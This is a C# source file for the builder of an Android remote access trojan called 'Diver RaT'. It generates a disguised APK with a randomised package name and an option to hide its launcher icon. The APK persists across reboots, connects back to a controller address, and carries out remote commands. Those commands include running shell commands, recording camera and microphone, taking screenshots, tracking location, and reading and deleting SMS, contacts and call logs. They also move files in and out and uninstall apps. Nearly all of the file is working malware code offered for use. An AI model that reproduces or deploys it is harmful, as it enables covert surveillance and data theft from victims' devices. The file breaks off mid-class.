using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class AndroidPayloadCreatorWindow : Window
    {
        private string _lastBuildError = string.Empty;

        public AndroidPayloadCreatorWindow()
        {
            InitializeComponent();
            IpTextBox.Text = string.IsNullOrWhiteSpace(ControllerSettings.Ip) ? GetLocalIpv4() : ControllerSettings.Ip;
            PortTextBox.Text = (ControllerSettings.Port + 1).ToString(System.Globalization.CultureInfo.InvariantCulture);
            OutputTextBox.Text = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "DiverPayloads");
        }

        private void BrowseButton_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new OpenFolderDialog { Title = "Select output folder" };
            if (dlg.ShowDialog(this) == true) OutputTextBox.Text = dlg.FolderName;
        }

        private void BrowseIconButton_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new OpenFileDialog
            {
                Title = "Select an icon image",
                Filter = "Images|*.png;*.jpg;*.jpeg;*.ico;*.bmp"
            };
            if (dlg.ShowDialog(this) != true) return;
            IconTextBox.Text = dlg.FileName;
            try { IconPreview.Source = PayloadIcon.ToBitmapSource(dlg.FileName); } catch { IconPreview.Source = null; }
        }

        private void ClearIconButton_Click(object sender, RoutedEventArgs e)
        {
            IconTextBox.Text = "";
            IconPreview.Source = null;
        }

        private void RandomPackageButton_Click(object sender, RoutedEventArgs e)
        {
            var rnd = new Random();
            const string alphabet = "abcdefghijklmnopqrstuvwxyz";
            string Word(int len)
            {
                var chars = new char[len];
                for (int i = 0; i < len; i++) chars[i] = alphabet[rnd.Next(alphabet.Length)];
                return new string(chars);
            }
            PackageTextBox.Text = $"com.{Word(6)}.{Word(7)}";
        }

        private void CloseButton_Click(object sender, RoutedEventArgs e) => Close();


        private async void GenerateButton_Click(object sender, RoutedEventArgs e)
        {
            if (!Validate(out int port)) return;
            var appName = AppNameTextBox.Text.Trim();
            var package = PackageTextBox.Text.Trim();
            var version = VersionTextBox.Text.Trim();
            if (string.IsNullOrWhiteSpace(appName)) { ProgressText.Text = "Enter an app name."; return; }
            if (!Regex.IsMatch(package, @"^[a-z][a-z0-9_]*(\.[a-z][a-z0-9_]*)+$"))
            {
                ProgressText.Text = "Package name must be lowercase, e.g. com.example.app";
                return;
            }
            if (string.IsNullOrWhiteSpace(version)) version = "1.0";
            var showLauncher = LauncherIconCheck.IsChecked == true;

            SetBusy(true);
            ProgressText.Text = "Generating Android payload... (first build downloads Gradle plugins, can take a few minutes)";

            try
            {
                var outDir = OutputTextBox.Text.Trim();
            var ip = IpTextBox.Text.Trim();
            Directory.CreateDirectory(outDir);

            var buildDir = Path.Combine(Path.GetTempPath(), "DiverAndroid_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(buildDir);
            var iconPath = IconTextBox.Text;

            await Task.Run(() => WriteProject(buildDir, ip, port, iconPath, appName, package, showLauncher, version));
            var apkName = SanitizeFileName(appName) + ".apk";
            bool ok = await Task.Run(() => RunGradle(buildDir, outDir, apkName));

            if (ok)
            {
                var apk = Path.Combine(outDir, apkName);
                ProgressText.Text = $"Done - created {apk}";
                InfoText.Text = $"Install {apk} on a target Android device (adb install -r {apk}). " +
                                $"It connects to {ip}:{port}, registers, then appears in the Android tab. " +
                                "Right-click it there to send commands.";
            }
                else
                {
                    ProgressText.Text = "Build failed. " + _lastBuildError;
                }
            }
            catch (Exception ex)
            {
                ProgressText.Text = "Error: " + ex.Message;
            }
            finally
            {
                SetBusy(false);
            }
        }

        private bool Validate(out int port)
        {
            port = 0;
            if (string.IsNullOrWhiteSpace(IpTextBox.Text))
            {
                ProgressText.Text = "Enter the controller IP address.";
                return false;
            }
            if (!int.TryParse(PortTextBox.Text.Trim(), out port) || port is < 1 or > 65535)
            {
                ProgressText.Text = "Enter a valid TCP port (1-65535).";
                return false;
            }
            return true;
        }

        private static void WriteProject(string root, string ip, int port, string iconPath = "",
            string appName = "Diver Agent", string packageName = "com.diverrat.agent",
            bool showLauncher = true, string version = "1.0")
        {
            var pkgPath = packageName.Replace('.', Path.DirectorySeparatorChar);
            var javaRoot = Path.Combine(root, "app", "src", "main", "java");
            var pkgDir = Path.Combine(javaRoot, pkgPath);
            Directory.CreateDirectory(pkgDir);
            Directory.CreateDirectory(Path.Combine(root, "app", "src", "main", "res", "values"));
            Directory.CreateDirectory(Path.Combine(root, "app", "src", "main", "res", "drawable"));

            var sdkPath = FindAndroidSdk();
            File.WriteAllText(Path.Combine(root, "settings.gradle.kts"), SettingsGradle);
            File.WriteAllText(Path.Combine(root, "build.gradle.kts"), RootBuildGradle);
            File.WriteAllText(Path.Combine(root, "gradle.properties"), GradleProperties);
            File.WriteAllText(Path.Combine(root, "local.properties"), "sdk.dir=" + sdkPath.Replace("\\", "/"));

            var appGradle = AppBuildGradle
                .Replace("namespace = \"com.diverrat.agent\"", "namespace = \"" + packageName + "\"")
                .Replace("applicationId = \"com.diverrat.agent\"", "applicationId = \"" + packageName + "\"")
                .Replace("versionName = \"1.0\"", "versionName = \"" + version + "\"");
            File.WriteAllText(Path.Combine(root, "app", "build.gradle.kts"), appGradle);

            var label = XmlEscape(appName);
            var manifest = AndroidManifest
                .Replace("android:label=\"Diver Agent\"", "android:label=\"" + label + "\"");
            if (!string.IsNullOrWhiteSpace(iconPath) && PayloadIcon.IsImageFile(iconPath))
            {
                PayloadIcon.WriteAndroidMipmaps(iconPath, Path.Combine(root, "app", "src", "main", "res"));
                manifest = manifest.Replace("android:icon=\"@drawable/ic_icon\"", "android:icon=\"@mipmap/ic_launcher\"");
            }
            if (!showLauncher)
            {
                manifest = Regex.Replace(manifest,
                    @"<activity\s+android:name="".PermissionActivity""[^>]*>\s*<intent-filter>\s*<action[^>]*MAIN[^>]*/>\s*<category[^>]*LAUNCHER[^>]*/>\s*</intent-filter>\s*</activity>",
                    "<activity android:name=\".PermissionActivity\" android:exported=\"true\" />",
                    RegexOptions.Singleline);
            }
            File.WriteAllText(Path.Combine(root, "app", "src", "main", "AndroidManifest.xml"), TrimLeadingWhitespace(manifest));
            File.WriteAllText(Path.Combine(root, "app", "src", "main", "res", "values", "strings.xml"),
                TrimLeadingWhitespace(StringsXml.Replace(">Diver Agent<", ">" + label + "<")));
            File.WriteAllText(Path.Combine(root, "app", "src", "main", "res", "drawable", "ic_icon.xml"), TrimLeadingWhitespace(IconXml));

            File.WriteAllText(Path.Combine(pkgDir, "PermissionActivity.kt"), PermissionActivityKt.Replace("package com.diverrat.agent", "package " + packageName));
            File.WriteAllText(Path.Combine(pkgDir, "ScreenCaptureActivity.kt"), ScreenCaptureActivityKt.Replace("package com.diverrat.agent", "package " + packageName));
            File.WriteAllText(Path.Combine(pkgDir, "BootReceiver.kt"), BootReceiverKt.Replace("package com.diverrat.agent", "package " + packageName));
            File.WriteAllText(Path.Combine(pkgDir, "AgentService.kt"),
                AgentServiceKt.Replace("package com.diverrat.agent", "package " + packageName)
                    .Replace("%%IP%%", ip).Replace("%%PORT%%", port.ToString()));
        }

        private static string XmlEscape(string s) =>
            s.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;")
             .Replace("\"", "&quot;").Replace("'", "&apos;");

        private static string SanitizeFileName(string name)
        {
            var invalid = Path.GetInvalidFileNameChars();
            var clean = new string(name.Select(c => invalid.Contains(c) || c == ' ' ? '_' : c).ToArray()).Trim('_');
            return string.IsNullOrWhiteSpace(clean) ? "agent" : clean;
        }

        private static string TrimLeadingWhitespace(string text)
        {
            var lines = text.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);
            for (int i = 0; i < lines.Length; i++)
                lines[i] = lines[i].TrimStart(' ', '\t');
            return string.Join("\n", lines);
        }

        private bool RunGradle(string buildDir, string outDir, string apkName)
        {
            var gradle = FindGradle();
            if (gradle is null)
            {
                _lastBuildError = "Gradle not found. Open Settings to download and bundle the build environment (JDK + Android SDK + Gradle).";
                return false;
            }

            var javaHome = FindJava();
            var sdkPath = FindAndroidSdk();

            void Configure(ProcessStartInfo psi)
            {
                psi.WorkingDirectory = buildDir;
                psi.UseShellExecute = false;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.CreateNoWindow = true;
                BuildEnvironment.EnsureGradleCacheDir();
                psi.EnvironmentVariables["GRADLE_USER_HOME"] = BuildEnvironment.GradleUserHome;
                if (!string.IsNullOrEmpty(javaHome))
                    psi.EnvironmentVariables["JAVA_HOME"] = javaHome;
                if (!string.IsNullOrEmpty(sdkPath))
                {
                    psi.EnvironmentVariables["ANDROID_HOME"] = sdkPath;
                    psi.EnvironmentVariables["ANDROID_SDK_ROOT"] = sdkPath;
                }
            }

            // Build the APK (directly with the found Gradle - no wrapper step, daemon enabled for speed)
            var psi2 = new ProcessStartInfo(gradle);
            Configure(psi2);
            psi2.ArgumentList.Add("assembleDebug");
            psi2.ArgumentList.Add("--console=plain");

            using var p = Process.Start(psi2);
            if (p == null) { _lastBuildError = "Could not start gradle."; return false; }

            var stdout = p.StandardOutput.ReadToEnd();
            var stderr = p.StandardError.ReadToEnd();
            p.WaitForExit();

            if (p.ExitCode != 0)
            {
                var tail = (stdout + "\n" + stderr)
                    .Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
                    .TakeLast(8);
                _lastBuildError = string.Join("  |  ", tail);
                return false;
            }

            var apk = Path.Combine(buildDir, "app", "build", "outputs", "apk", "debug", "app-debug.apk");
            if (!File.Exists(apk))
            {
                _lastBuildError = "Build succeeded but APK not found.";
                return false;
            }

            var dest = Path.Combine(outDir, apkName);
            File.Copy(apk, dest, true);
            return true;
        }

        private static string FindAndroidSdk() => BuildEnvironment.GetAndroidSdk();

        private static string? FindJava() => BuildEnvironment.GetJavaHome();

        private static string? FindGradle() => BuildEnvironment.GetGradleBat();

        private void SetBusy(bool busy)
        {
            GenerateButton.IsEnabled = !busy;
            BrowseButton.IsEnabled = !busy;
            CancelButton.Content = busy ? "Working..." : "Close";
            BuildProgress.Visibility = busy ? Visibility.Visible : Visibility.Collapsed;
        }

        private static string GetLocalIpv4()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                var ip = host.AddressList.FirstOrDefault(a =>
                    a.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(a));
                return ip?.ToString() ?? "127.0.0.1";
            }
            catch
            {
                return "127.0.0.1";
            }
        }

        // ---- embedded Android project templates ----

        private const string SettingsGradle = """
        pluginManagement {
            repositories {
                google()
                mavenCentral()
                gradlePluginPortal()
            }
        }
        dependencyResolutionManagement {
            repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
            repositories {
                google()
                mavenCentral()
            }
        }
        rootProject.name = "DiverAgent"
        include(":app")
        """;

        private const string RootBuildGradle = """
        plugins {
            id("com.android.application") version "8.7.0" apply false
            id("org.jetbrains.kotlin.android") version "2.0.20" apply false
        }
        """;

        private const string GradleProperties = """
        org.gradle.jvmargs=-Xmx2048m -Dfile.encoding=UTF-8
        android.useAndroidX=true
        kotlin.code.style=official
        android.nonTransitiveRClass=true
        """;

        private const string AppBuildGradle = """
        plugins {
            id("com.android.application")
            id("org.jetbrains.kotlin.android")
        }

        android {
            namespace = "com.diverrat.agent"
            compileSdk = 34
            buildToolsVersion = "35.0.0"

            defaultConfig {
                applicationId = "com.diverrat.agent"
                minSdk = 24
                targetSdk = 34
                versionCode = 1
                versionName = "1.0"
            }

            buildTypes {
                getByName("release") {
                    isMinifyEnabled = false
                }
                getByName("debug") {
                    isMinifyEnabled = false
                }
            }

            compileOptions {
                sourceCompatibility = JavaVersion.VERSION_17
                targetCompatibility = JavaVersion.VERSION_17
            }
            kotlinOptions {
                jvmTarget = "17"
            }
        }

        dependencies {
            implementation("androidx.core:core-ktx:1.13.1")
        }
        """;

        private const string AndroidManifest = """
        <?xml version="1.0" encoding="utf-8"?>
        <manifest xmlns:android="http://schemas.android.com/apk/res/android"
            xmlns:tools="http://schemas.android.com/tools">

            <uses-permission android:name="android.permission.INTERNET" />
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
            <uses-permission android:name="android.permission.WAKE_LOCK" />
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
            <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
            <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
            <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />

            <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
            <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />

            <uses-permission android:name="android.permission.CAMERA" />
            <uses-permission android:name="android.permission.RECORD_AUDIO" />

            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />

            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
            <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
            <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
            <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
            <uses-permission android:name="android.permission.READ_CONTACTS" />
            <uses-permission android:name="android.permission.WRITE_CONTACTS" />
            <uses-permission android:name="android.permission.READ_CALL_LOG" />
            <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
            <uses-permission android:name="android.permission.READ_SMS" />

            <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />

            <uses-feature android:name="android.hardware.camera" android:required="false" />
            <uses-feature android:name="android.hardware.microphone" android:required="false" />

            <application
                android:allowBackup="false"
                android:label="Diver Agent"
                android:icon="@drawable/ic_icon"
                android:supportsRtl="true"
                android:theme="@android:style/Theme.Material.NoActionBar">

                <activity android:name=".PermissionActivity" android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.MAIN" />
                        <category android:name="android.intent.category.LAUNCHER" />
                    </intent-filter>
                </activity>

                <activity android:name=".ScreenCaptureActivity" android:exported="false"
                          android:theme="@android:style/Theme.Translucent.NoTitleBar" />

                <service
                    android:name=".AgentService"
                    android:foregroundServiceType="dataSync|mediaProjection|camera|microphone"
                    android:exported="false" />

                <receiver android:name=".BootReceiver" android:exported="true">
                    <intent-filter>
                        <action android:name="android.intent.action.BOOT_COMPLETED" />
                        <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                        <action android:name="android.intent.action.USER_PRESENT" />
                        <action android:name="android.intent.action.POWER_CONNECTED" />
                    </intent-filter>
                </receiver>
            </application>
        </manifest>
        """;

        private const string StringsXml = """
        <resources>
            <string name="app_name">Diver Agent</string>
        </resources>
        """;

        private const string IconXml = """
        <vector xmlns:android="http://schemas.android.com/apk/res/android"
            android:width="48dp"
            android:height="48dp"
            android:viewportWidth="24"
            android:viewportHeight="24">
            <path
                android:fillColor="#B4FF00"
                android:pathData="M12,2L2,22h20L12,2zM12,7l6.5,13h-13L12,7z" />
        </vector>
        """;

        private const string PermissionActivityKt = """
        package com.diverrat.agent

        import android.app.Activity
        import android.content.Context
        import android.content.Intent
        import android.content.pm.PackageManager
        import android.net.Uri
        import android.os.Build
        import android.os.Bundle
        import android.os.PowerManager
        import android.provider.Settings
        import androidx.core.app.ActivityCompat
        import androidx.core.content.ContextCompat

        class PermissionActivity : Activity() {
            companion object {
                private val PERMS = arrayOf(
                    android.Manifest.permission.CAMERA,
                    android.Manifest.permission.RECORD_AUDIO,
                    android.Manifest.permission.ACCESS_FINE_LOCATION,
                    android.Manifest.permission.ACCESS_COARSE_LOCATION,
                    android.Manifest.permission.READ_MEDIA_IMAGES,
                    android.Manifest.permission.READ_MEDIA_VIDEO,
                    android.Manifest.permission.READ_MEDIA_AUDIO,
                    android.Manifest.permission.POST_NOTIFICATIONS,
                    android.Manifest.permission.READ_CONTACTS,
                    android.Manifest.permission.WRITE_CONTACTS,
                    android.Manifest.permission.READ_CALL_LOG,
                    android.Manifest.permission.READ_SMS
                )
                private const val REQ_PERMS = 1001
                private const val REQ_BATTERY = 1002
                private const val REQ_FILES = 1003
                private const val REQ_OVERLAY = 1004
            }

            private var step = 0

            override fun onCreate(savedInstanceState: Bundle?) {
                super.onCreate(savedInstanceState)
                // Always connect first so the agent is live while the user approves settings
                try { startForegroundService(Intent(this, AgentService::class.java)) } catch (_: Exception) {}
                val needed = PERMS.filter {
                    ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
                }.toTypedArray()
                if (needed.isNotEmpty()) {
                    ActivityCompat.requestPermissions(this, needed, REQ_PERMS)
                } else {
                    nextStep()
                }
            }

            override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
                super.onRequestPermissionsResult(requestCode, permissions, grantResults)
                nextStep()
            }

            override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
                super.onActivityResult(requestCode, resultCode, data)
                nextStep()
            }

            private fun nextStep() {
                when (step) {
                    0 -> { step = 1; requestBatteryExemption() }
                    1 -> { step = 2; requestAllFilesAccess() }
                    2 -> { step = 3; requestOverlayPermission() }
                    else -> finish()
                }
            }

            private fun requestBatteryExemption() {
                if (Build.VERSION.SDK_INT >= 23) {
                    try {
                        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                                .setData(Uri.parse("package:$packageName"))
                            startActivityForResult(intent, REQ_BATTERY)
                            return
                        }
                    } catch (_: Exception) {}
                }
                nextStep()
            }

            private fun requestAllFilesAccess() {
                if (Build.VERSION.SDK_INT >= 30) {
                    try {
                        if (!android.os.Environment.isExternalStorageManager()) {
                            val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
                                .setData(Uri.parse("package:$packageName"))
                            startActivityForResult(intent, REQ_FILES)
                            return
                        }
                    } catch (_: Exception) {}
                }
                nextStep()
            }

            private fun requestOverlayPermission() {
                if (Build.VERSION.SDK_INT >= 23) {
                    try {
                        if (!Settings.canDrawOverlays(this)) {
                            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                                .setData(Uri.parse("package:$packageName"))
                            startActivityForResult(intent, REQ_OVERLAY)
                            return
                        }
                    } catch (_: Exception) {}
                }
                nextStep()
            }
        }
        """;

        private const string BootReceiverKt = """
        package com.diverrat.agent

        import android.content.BroadcastReceiver
        import android.content.Context
        import android.content.Intent
        import android.os.Build

        class BootReceiver : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                val action = intent.action ?: return
                val shouldStart = action == Intent.ACTION_BOOT_COMPLETED ||
                    action == Intent.ACTION_MY_PACKAGE_REPLACED ||
                    action == Intent.ACTION_USER_PRESENT ||
                    action == Intent.ACTION_POWER_CONNECTED
                if (shouldStart) {
                    val svc = Intent(context, AgentService::class.java)
                    try {
                        if (Build.VERSION.SDK_INT >= 26) context.startForegroundService(svc) else context.startService(svc)
                    } catch (_: Exception) {}
                }
            }
        }
        """;

        private const string ScreenCaptureActivityKt = """
        package com.diverrat.agent

        import android.app.Activity
        import android.content.Context
        import android.content.Intent
        import android.media.projection.MediaProjectionManager
        import android.os.Build
        import android.os.Bundle

        class ScreenCaptureActivity : Activity() {
            companion object {
                private const val REQ = 2001
            }

            override fun onCreate(savedInstanceState: Bundle?) {
                super.onCreate(savedInstanceState)
                val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                startActivityForResult(mpm.createScreenCaptureIntent(), REQ)
            }

            override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
                super.onActivityResult(requestCode, resultCode, data)
                if (requestCode == REQ && resultCode == RESULT_OK && data != null) {
                    ScreenShare.pending = false
                    val svc = Intent(this, AgentService::class.java).setAction("START_SCREEN_SHARE")
                    svc.putExtra("resultCode", resultCode)
                    svc.putExtra("data", data)
                    if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc) else startService(svc)
                } else {
                    ScreenShare.pending = false
                }
                finish()
            }
        }
        """;

        private const string AgentServiceKt = """"
        package com.diverrat.agent

        import android.app.Notification
        import android.app.NotificationChannel
        import android.app.NotificationManager
        import android.app.Service
        import android.content.Context
        import android.content.Intent
        import android.content.pm.ServiceInfo
        import android.os.Build
        import android.os.Handler
        import android.os.IBinder
        import android.os.Looper
        import android.os.PowerManager
        import android.provider.Settings
        import android.widget.Toast
        import androidx.core.app.ServiceCompat
        import org.json.JSONArray
        import org.json.JSONObject
        import java.io.BufferedReader
        import java.io.InputStreamReader
        import java.io.OutputStream
        import java.net.InetSocketAddress
        import java.net.Socket
        import java.util.UUID
        import kotlin.concurrent.thread

        class AgentService : Service() {
            private val handler = Handler(Looper.getMainLooper())
            private var worker: Thread? = null
            private var wakeLock: PowerManager.WakeLock? = null
            private var wifiLock: android.net.wifi.WifiManager.WifiLock? = null
            private var overlayView: android.view.View? = null
            private var windowManager: android.view.WindowManager? = null
            @Volatile private var running = false

            override fun onCreate() {
                super.onCreate()
                createChannel()
                AgentService.instance = this
                try {
                    val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
                    wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "diver:keepalive")
                    wakeLock?.acquire()
                } catch (_: Exception) {}
                try {
                    val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                    wifiLock = wm.createWifiLock(android.net.wifi.WifiManager.WIFI_MODE_FULL_HIGH_PERF, "diver:wifi")
                    wifiLock?.acquire()
                } catch (_: Exception) {}
            }

            override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
                if (intent?.action == "START_SCREEN_SHARE") {
                    val resultCode = intent.getIntExtra("resultCode", 0)
                    val data = if (Build.VERSION.SDK_INT >= 33) {
                        intent.getParcelableExtra("data", Intent::class.java)
                    } else {
                        @Suppress("DEPRECATION") intent.getParcelableExtra("data")
                    }
                    startForegroundInternal(screenShare = true)
                    if (data != null) {
                        handler.post { ScreenShare.start(this, resultCode, data) }
                    }
                    if (!running) {
                        running = true
                        worker = thread { connectionLoop() }
                    }
                    return START_STICKY
                }
                startForegroundInternal(screenShare = false)
                showKeepAliveOverlay()
                if (!running) {
                    running = true
                    worker = thread { connectionLoop() }
                }
                return START_STICKY
            }

            private fun showKeepAliveOverlay() {
                try {
                    if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) return
                    hideKeepAliveOverlay()
                    windowManager = getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
                    val size = (18 * resources.displayMetrics.density).toInt()
                    val view = android.view.View(this)
                    view.setBackgroundColor(android.graphics.Color.argb(90, 180, 255, 0))
                    val type = if (Build.VERSION.SDK_INT >= 26) {
                        android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    } else {
                        @Suppress("DEPRECATION") android.view.WindowManager.LayoutParams.TYPE_PHONE
                    }
                    val params = android.view.WindowManager.LayoutParams(
                        size, size, type,
                        android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                        android.graphics.PixelFormat.TRANSLUCENT)
                    params.gravity = android.view.Gravity.TOP or android.view.Gravity.END
                    params.x = 12
                    params.y = 14
                    windowManager?.addView(view, params)
                    overlayView = view
                } catch (_: Exception) {}
            }

            private fun hideKeepAliveOverlay() {
                try {
                    overlayView?.let { windowManager?.removeView(it) }
                } catch (_: Exception) {}
                overlayView = null
            }

            private fun startForegroundInternal(screenShare: Boolean, camera: Boolean = false) {
                try {
                    val text = if (screenShare) "Screen sharing" else "Running"
                    val notif = if (Build.VERSION.SDK_INT >= 26) {
                        Notification.Builder(this, CHANNEL_ID)
                            .setContentTitle("Diver Agent")
                            .setContentText(text)
                            .setSmallIcon(R.drawable.ic_icon)
                            .setOngoing(true)
                            .build()
                    } else {
                        @Suppress("DEPRECATION")
                        Notification.Builder(this)
                            .setContentTitle("Diver Agent")
                            .setContentText(text)
                            .setSmallIcon(R.drawable.ic_icon)
                            .setOngoing(true)
                            .build()
                    }
                    var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
                    if (screenShare) type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                    if (camera) type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    try {
                        ServiceCompat.startForeground(this, 1, notif, type)
                    } catch (e: Exception) {
                        @Suppress("DEPRECATION")
                        startForeground(1, notif)
                    }
                } catch (_: Exception) {}
            }

            override fun onBind(intent: Intent?): IBinder? = null

            override fun onDestroy() {
                running = false
                worker?.interrupt()
                try { wakeLock?.release() } catch (_: Exception) {}
                wakeLock = null
                try { wifiLock?.release() } catch (_: Exception) {}
                wifiLock = null
                hideKeepAliveOverlay()
                if (AgentService.instance === this) AgentService.instance = null
                super.onDestroy()
            }

            private fun createChannel() {
                if (Build.VERSION.SDK_INT >= 26) {
                    val ch = NotificationChannel(CHANNEL_ID, "Agent", NotificationManager.IMPORTANCE_LOW)
                    getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
                }
            }

            private fun connectionLoop() {
                while (running) {
                    try {
                        Socket().use { sock ->
                            sock.connect(InetSocketAddress(HOST, PORT), 10000)
                            sock.keepAlive = true
                            sock.tcpNoDelay = true
                            val out = sock.getOutputStream()
                            val reader = BufferedReader(InputStreamReader(sock.inputStream, "UTF-8"))
                            send(out, registerJson())

                            val readThread = thread(name = "diver-read") {
                                try {
                                    while (running) {
                                        val line = reader.readLine() ?: break
                                        if (line.isNotEmpty()) handleCommand(line, out)
                                    }
                                } catch (_: Exception) {}
                            }

                            while (running) {
                                try { Thread.sleep(HEARTBEAT_MS) } catch (_: InterruptedException) { break }
                                send(out, """{"type":"HEARTBEAT"}""")
                            }
                            readThread.interrupt()
                        }
                    } catch (e: Exception) {
                    }
                    try { Thread.sleep(5000) } catch (_: InterruptedException) {}
                }
            }

            private val sendLock = Object()

            private fun send(out: OutputStream, json: String) {
                synchronized(sendLock) {
                    out.write((json + "\n").toByteArray(Charsets.UTF_8))
                    out.flush()
                }
            }

            private fun registerJson(): String {
                val data = JSONObject()
                data.put("id", loadId())
                data.put("hostname", Build.MODEL)
                data.put("os", "Android " + Build.VERSION.RELEASE)
                data.put("username", Build.USER ?: "")
                data.put("country", "??")
                data.put("deviceType", "Android")
                data.put("ip", localIp())
                val m = JSONObject()
                m.put("type", "REGISTER")
                m.put("data", data)
                return m.toString()
            }

            private fun handleCommand(line: String, out: OutputStream) {
                var l = line
                if (l.startsWith("\uFEFF")) l = l.substring(1)
                val msg = try { JSONObject(l) } catch (_: Exception) { return }
                if (msg.optString("type") != "COMMAND") return
                val cmd = msg.optString("command")
                val reqId = msg.optString("requestId")
                val args = msg.optJSONObject("args")
                var ok = true
                var data: String = ""
                try {
                    data = when (cmd) {
                        "GET_INFO" -> "host=" + Build.MODEL + ";os=Android " + Build.VERSION.RELEASE + ";user=" + (Build.USER ?: "")
                        "SHELL" -> runShell(args?.optString("cmd") ?: "")
                        "LIST_PROCESSES" -> listProcesses()
                        "LIST_APPS" -> listApps()
                        "GET_LOCATION" -> getLocation()
                        "OPEN_URL" -> { openUrl(args?.optString("url") ?: "https://example.com"); "opened" }
                        "MESSAGE_BOX" -> { toast(args?.optString("text") ?: "Hello"); "shown" }
                        "WEBCAM" -> captureCamera()
                        "LIST_CAMS" -> listCams()
                        "START_AUDIO" -> { startRecording(); "audio recording started" }
                        "GET_AUDIO" -> getRecordedAudio() ?: ""
                        "STOP_AUDIO" -> { stopRecording(); "audio recording stopped" }
                        "LIST_MICS" -> listMics()
                        "LIST_CONTACTS" -> listContacts()
                        "LIST_CALLS" -> listCalls()
                        "LIST_SMS" -> listSms()
                        "DELETE_CONTACT" -> deleteContact(args?.optString("id") ?: "")
                        "DELETE_CALL" -> deleteCall(args?.optString("id") ?: "")
                        "DELETE_SMS" -> deleteSms(args?.optString("id") ?: "")
                        "UNINSTALL_APP" -> uninstallApp(args?.optString("package") ?: "")
                        "LIST_DRIVES" -> listDrives()
                        "LIST_DIR" -> listDir(args?.optString("path") ?: java.io.File(android.os.Environment.getExternalStorageDirectory().absolutePath).path)
                        "LIST_SCREENS" -> listScreens()
                        "SCREENSHOT" -> captureScreen()
                        "DOWNLOAD" -> downloadFile(args?.optString("path") ?: "")
                        "UPLOAD" -> uploadFile(args?.optString("path") ?: "", args?.optString("data") ?: "")
                        "LIST_PHOTOS" -> listMedia("images")
                        "LIST_VIDEOS" -> listMedia("videos")
                        "LIST_AUDIO_FILES" -> listMedia("audio")
                        "DISCONNECT" -> { running = false; handler.post { stopSelf() }; "bye" }
                        "PING" -> "pong"
                        else -> "command not implemented on android"
                    }
                } catch (e: Exception) {
                    ok = false
                    data = e.message ?: "error"
                }
                val resp = JSONObject()
                resp.put("type", "RESULT")
                resp.put("requestId", reqId)
                resp.put("command", cmd)
                resp.put("success", ok)
                resp.put("data", data)
                send(out, resp.toString())
            }

            private val shellLock = Object()
            private var shellProc: Process? = null
